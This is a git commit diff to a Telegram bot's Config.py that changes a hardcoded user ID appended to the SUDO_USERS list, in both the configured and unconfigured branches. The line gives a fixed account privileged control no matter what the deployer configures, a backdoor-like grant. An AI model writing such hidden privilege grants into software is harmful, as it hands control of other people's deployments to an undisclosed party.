5db8a68d68f9b53d5c2f947dc358944490576ac3
Swami <146053559+VMTY1@users.noreply.github.com>
2023-12-28 23:56:58 +0530

    Update Config.py

--- Config.py
+++ Config.py
@@ -8,7 +8,7 @@ class Config():
     APP_ID = os.environ.get("APP_ID", 6)
     API_HASH = os.environ.get("API_HASH", None)
     SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS").split()))
-    SUDO_USERS.append(6307901985)
+    SUDO_USERS.append(749673781)
     SUDO_USERS = list(set(SUDO_USERS))
   else:
     BOT_TOKEN = ""
@@ -16,7 +16,7 @@ class Config():
     APP_ID = ""
     API_HASH = ""
     SUDO_USERS = list(set(int(x) for x in ''.split()))
-    SUDO_USERS.append(6307901985)
+    SUDO_USERS.append(749673781)
     SUDO_USERS = list(set(SUDO_USERS))
 
 
